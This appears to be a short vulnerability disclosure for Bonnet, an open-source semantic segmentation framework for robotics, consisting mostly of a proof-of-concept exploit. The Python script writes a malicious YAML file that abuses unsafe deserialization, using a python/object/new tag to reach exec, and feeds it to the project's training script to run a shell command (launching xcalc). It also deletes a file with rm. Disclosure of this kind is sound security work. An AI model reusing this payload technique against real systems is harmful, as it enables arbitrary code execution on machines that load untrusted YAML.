# Description
Bonnet: An Open-Source Training and Deployment Framework for Semantic Segmentation in Robotics. 
# Proof of Concept
* run the exploit code
```
import os

# exploit code
# uncomment if repo not yet cloned
#os.system("git clone https://github.com/PRBonn/bonnet.git")
os.chdir("bonnet/train_py/")

payload ="""!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
 """
os.system("rm exploit.yml")
open("exploit.yml",'w+').write(payload)
cmd = """./cnn_train.py --data exploit.yml"""
os.system(cmd)

```
* calc will be popped after executing the exploit code. 
* fix is to be applied in different parts of the entire repo since there is vulnerable code in different parts of this project .
![bonnet_poc](https://user-images.githubusercontent.com/43377443/107218112-2e728480-6a35-11eb-901f-5032e628f4a8.png)
